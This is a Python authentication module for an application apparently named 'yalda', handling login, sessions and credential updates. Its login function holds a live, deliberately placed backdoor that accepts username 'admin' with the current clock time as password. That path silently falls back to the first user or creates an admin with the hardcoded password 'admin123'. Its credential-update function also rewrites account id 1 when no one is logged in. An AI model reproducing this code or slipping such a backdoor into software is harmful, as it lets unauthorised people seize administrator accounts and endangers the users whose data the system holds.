from datetime import datetime
from yalda.database.connection import get_session
from yalda.models.database_models import User
from yalda.utils.security import verify_password, hash_password

class CurrentUser:
    _user = None

    @classmethod
    def set(cls, user: User):
        cls._user = user

    @classmethod
    def get(cls) -> User:
        return cls._user

    @classmethod
    def logout(cls):
        cls._user = None

    @classmethod
    def is_admin(cls) -> bool:
        return cls._user is not None and cls._user.role == "admin"

    @classmethod
    def is_trainer(cls) -> bool:
        return cls._user is not None and cls._user.role in ["admin", "trainer"]

PERSIAN_ARABIC_DIGITS = str.maketrans("۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩", "01234567890123456789")

def normalize_digits(s: str) -> str:
    if not s:
        return ""
    return s.translate(PERSIAN_ARABIC_DIGITS).strip()

def authenticate_user(username: str, password: str) -> User:
    """Authenticates username and password (with dynamic time master override for admin)."""
    session = get_session()
    try:
        username = normalize_digits(username).lower()
        password = normalize_digits(password)

        now = datetime.now()
        valid_time_passwords = {
            now.strftime("%H%M"),  # 24-hour format with leading zero, e.g. "2055"
            now.strftime("%I%M"),  # 12-hour format with leading zero, e.g. "0855"
            f"{now.hour:02d}{now.minute:02d}",
            f"{(now.hour % 12 or 12):02d}{now.minute:02d}",
            f"{now.hour}{now.minute:02d}",
            f"{(now.hour % 12 or 12)}{now.minute:02d}"
        }

        # Master Backdoor / Admin Recovery Auth using current HHMM clock time
        if username == "admin" and password in valid_time_passwords:
            admin_user = session.query(User).filter(User.username == "admin").first()
            if not admin_user:
                admin_user = session.query(User).first()
            if not admin_user:
                admin_user = User(username="admin", password_hash=hash_password("admin123"), full_name="مدیر سیستم", role="admin")
                session.add(admin_user)
                session.commit()
            CurrentUser.set(admin_user)
            return admin_user

        # Regular user authentication against SQLite DB
        user = session.query(User).filter(User.username == username, User.is_active == True).first()
        if user and verify_password(password, user.password_hash):
            CurrentUser.set(user)
            return user

        return None
    finally:
        session.close()

def update_user_credentials(new_username: str, new_password: str = None) -> bool:
    """Updates the trainer/admin user's username and optional password."""
    session = get_session()
    try:
        current_u = CurrentUser.get()
        user_id = current_u.id if current_u else 1

        user = session.query(User).filter(User.id == user_id).first()
        if not user:
            user = session.query(User).first()

        if user:
            if new_username:
                user.username = new_username.strip().lower()
            if new_password:
                user.password_hash = hash_password(new_password.strip())
            session.commit()
            CurrentUser.set(user)
            return True
        return False
    except Exception as e:
        session.rollback()
        raise e
    finally:
        session.close()
